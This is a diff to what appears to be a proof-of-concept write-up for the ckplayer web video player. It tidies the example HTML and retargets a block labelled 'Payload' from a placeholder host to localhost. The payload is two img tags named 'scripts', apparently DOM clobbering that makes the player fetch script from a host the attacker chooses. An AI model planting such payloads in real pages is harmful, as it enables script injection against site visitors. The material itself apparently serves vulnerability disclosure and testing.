@@ -42,9 +42,8 @@ function getPath(siz) {
 ```html
 
 <!--Library-->
-<script>
 <link type="text/css" rel="stylesheet" href="ckplayer/css/ckplayer.css" />
-<script type="text/javascript" src="ckplayer/js/ckplayer.js" charset="UTF-8"></script>
+<script type="text/javascript" src="./ckplayer/js/ckplayer.js" charset="UTF-8"></script>
 <div class="video" style="width: 600px;height: 400px;">播放器容器</div>
 <script type="text/javascript">
     var videoObject = {
@@ -54,11 +53,10 @@ function getPath(siz) {
     };
     var player = new ckplayer(videoObject);
 </script>
-</script>
 <!--Library-->
 
 <!--Payload-->
-<img name="scripts" src="https://xxx.xxx.xxx/js/">
-<img name="scripts" src="https://xxx.xxx.xxx/js/">
+<img name="scripts" src="http://localhost:9999/js/">
+<img name="scripts" src="http://localhost:9999/js/">
 <!--Payload-->
 ```
